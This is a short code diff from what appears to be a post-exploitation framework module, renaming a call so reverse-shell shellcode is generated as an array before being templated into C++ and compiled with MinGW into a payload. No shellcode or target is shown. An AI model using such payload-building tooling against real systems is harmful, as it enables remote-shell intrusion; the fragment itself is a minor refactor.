@@ -35,7 +35,7 @@ class PostModule(PostPythonModule):
         return True, None
 
     def run(self):
-        shellcode = self.generate_hex_reverse_shellcode_by_handler()
+        shellcode = self.generate_hex_reverse_shellcode_array_by_handler()
         source_code = self.generate_context_by_template(filename="main.cpp", SHELLCODE_STR=shellcode)
         mingw = Mingw(include_dir=self.module_data_dir, source_code=source_code)
         payload = self.get_handler_payload()
